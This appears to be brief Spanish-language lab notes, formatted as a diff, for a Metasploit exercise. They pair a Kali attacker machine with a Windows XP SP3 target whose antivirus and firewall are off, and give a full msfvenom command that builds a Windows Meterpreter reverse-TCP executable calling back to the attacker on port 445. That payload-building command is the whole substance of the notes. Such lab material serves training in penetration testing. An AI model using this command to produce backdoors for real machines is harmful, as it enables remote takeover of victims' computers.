@@ -1,1 +1,5 @@
+++ PC1: Kali
+++ PC2: Windows XP SP3
 
+++ PC2 Sin Antivirus y con el Firewall Desactivado
+++ PC1 msfvenom -p windows/meterpreter_reverse_tcp LHOST=<ip_PC1> LPORT=445 -f exe > <nombre_archivo.exe>
